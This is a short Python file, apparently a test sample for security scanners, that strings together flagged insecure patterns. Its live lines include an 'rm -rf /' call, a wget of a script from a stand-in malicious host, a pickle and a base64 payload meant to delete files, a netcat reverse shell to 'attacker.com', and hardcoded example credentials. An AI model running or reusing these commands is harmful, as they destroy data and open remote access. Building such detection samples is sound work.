import os
import subprocess
import base64
import pickle

# Dangerous command injection
os.system("rm -rf /")  # 🚨 Critical: Deletes all files
subprocess.call("wget http://malicious-site.com/malware.sh", shell=True)  # 🚨 Downloads malware

# Hardcoded secrets
AWS_ACCESS_KEY_ID = "AKIAEXAMPLE1234567890"  # 🚨 Hardcoded AWS Key
AWS_SECRET_ACCESS_KEY = "wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY"  # 🚨 Hardcoded AWS Secret
DATABASE_PASSWORD = "supersecretpassword"  # 🚨 Hardcoded DB password

# Weak file permissions
os.chmod("important_config.txt", 0o777)  # 🚨 World-writable file

# Insecure deserialization
data = pickle.loads(b"cos\nsystem\n(S'rm -rf /'\ntR.")  # 🚨 Arbitrary code execution via pickle

# Use of eval()
user_input = "print('Hacked!')"  
eval(user_input)  # 🚨 Arbitrary code execution

# Encoded malware pattern
exec(base64.b64decode("Y29zLnN5c3RlbSgncm0gLXJmIC8nKQ=="))  # 🚨 Deletes all files after decoding

# Suspicious networking command
subprocess.run(["nc", "-e", "/bin/sh", "attacker.com", "4444"])  # 🚨 Creates a reverse shell

print("Test file executed successfully!")

